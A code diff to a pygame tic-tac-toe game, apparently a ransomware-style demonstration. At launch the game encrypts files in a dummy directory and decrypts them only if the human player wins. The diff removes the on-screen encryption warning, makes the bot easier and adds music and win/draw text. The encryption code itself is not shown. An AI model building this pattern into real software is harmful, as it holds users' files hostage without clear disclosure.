@@ -13,42 +13,38 @@ def main():
         encrypt_files(DUMMY_FILES_DIR)
         set_encryption_status("encrypted")
 
-    show_warning()  # Display the encryption warning
-
     running = True
     player = "X"
     winner = None
     game_over = False
-    games_counter = 1
+
+    pygame.mixer.music.load("assets/background_music.mp3")
+    pygame.mixer.music.play(-1)
 
     while running:
-        SCREEN.fill(WHITE)
+        SCREEN.fill(BACKGROUND_COLOR)
+        draw_title()
         draw_grid()
         draw_symbols()
 
-        if winner=="O" or is_draw() and games_counter <= 3:
-            games_counter += 1
-            show_end_of_round()
-            reset_board()
-
-
-
-        if winner == "X" and is_encrypted():
+        if winner or is_draw():
             game_over = True
-            decrypt_files(DUMMY_FILES_DIR)  # Decrypt files only if X wins
-            set_encryption_status("decrypted")
-            show_when_user_won()
 
-
-
-
+            if winner == "X":
+                draw_flickering_text(f"Winner is {winner}", MESSAGE_FONT, TEXT_COLOR, -50, 750)
+                decrypt_files(DUMMY_FILES_DIR)
+                set_encryption_status("decrypted")
+            elif winner == "O":
+                draw_flickering_text(f"Winner is {winner}", MESSAGE_FONT, RED, -50, 750)
+            else:
+                draw_flickering_text("DRAW", MESSAGE_FONT, WHITE, -50, 750)
 
         for event in pygame.event.get():
             if event.type == pygame.QUIT:
                 running = False
             if event.type == pygame.MOUSEBUTTONDOWN and not game_over:
                 x, y = event.pos
-                col = x // CELL_SIZE
+                col = (x - HORIZONTAL_OFFSET) // CELL_SIZE
                 row = y // CELL_SIZE
 
                 if GRID[row][col] is None:
@@ -56,12 +52,7 @@ def main():
                     winner = check_winner()
 
                     if not winner and not is_draw():
-                        # Pick the bot difficulty by commenting the other two
-                        # bot = easy_bot
-                        # bot = medium_bot
-                        bot = hard_bot
-
-                        bot_move = bot(GRID, "O", "X")
+                        bot_move = easy_bot(GRID, "O", "X")
                         if bot_move:
                             GRID[bot_move[0]][bot_move[1]] = "O"
                             winner = check_winner()
